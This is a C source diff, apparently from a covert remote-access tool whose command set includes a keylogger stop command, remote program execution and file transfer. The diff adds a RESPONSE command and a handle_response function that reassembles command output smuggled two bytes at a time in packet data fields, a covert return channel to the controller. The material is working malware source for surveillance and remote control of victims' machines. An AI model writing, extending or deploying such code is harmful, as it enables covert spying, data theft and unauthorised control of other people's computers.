@@ -73,6 +73,10 @@ bool handle_command_codes(struct session_info * session_info, const struct packe
             log_message("Stop Keylogger\n");
             encountered_command_code = STOP_KEYLOGGER;
             break;
+        case RESPONSE:
+            log_message("Handling Response");
+            encountered_command_code = RESPONSE;
+            break;
         case RUN_PROGRAM:
             log_message("Running Program\n");
             encountered_command_code = RUN_PROGRAM;
@@ -293,7 +297,7 @@ void process_run_command(struct session_info * session_info) {
     log_message("Command: %s", command);
 
     #ifdef CLIENT_BUILD
-        run_process(command);
+        run_process(session_info, command);
     #endif
 
 }
@@ -465,3 +469,47 @@ void send_receive_file(const struct server_options * server_options) {
     }
 }
 
+// NOLINTNEXTLINE
+void handle_response(struct session_info * session_info) {
+    print_linked_list(session_info->head);
+
+    const int data_packet_to_read = calculate_data_packet_count(session_info);
+    log_message("Data packets to read %d", data_packet_to_read);
+    log_message("Packet counter: %d, Data Counter: %d", session_info->packet_counter, session_info->data_counter);
+
+    const struct packet_data * packet_data = session_info->head;
+
+    char response[RESPONSE_BUFFER_LENGTH] = {0};
+    int response_length = 0;
+
+    while (packet_data != NULL) {
+        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
+        const uint8_t second_byte = (packet_data->data) & 0xFF;
+
+        log_message("First Byte %d", first_byte);
+        log_message("Second Byte %d", second_byte);
+
+        if (first_byte == RUN_PROGRAM && second_byte == RUN_PROGRAM) {
+            break;
+        }
+
+        if (response_length < (int)sizeof(response) - 2) {
+            if (first_byte == 0) {
+                response[response_length++] = (char)second_byte;
+            } else {
+                response[response_length++] = (char)first_byte;
+                response[response_length++] = (char)second_byte;
+            }
+        }
+
+        packet_data = packet_data->next;
+    }
+
+    while (response_length > 0 && (response[response_length - 1] == '\0' || response[response_length - 1] == ' ')) {
+        response_length--;
+    }
+
+    response[response_length] = '\0';
+
+    log_message("Response received: %s", response);
+}
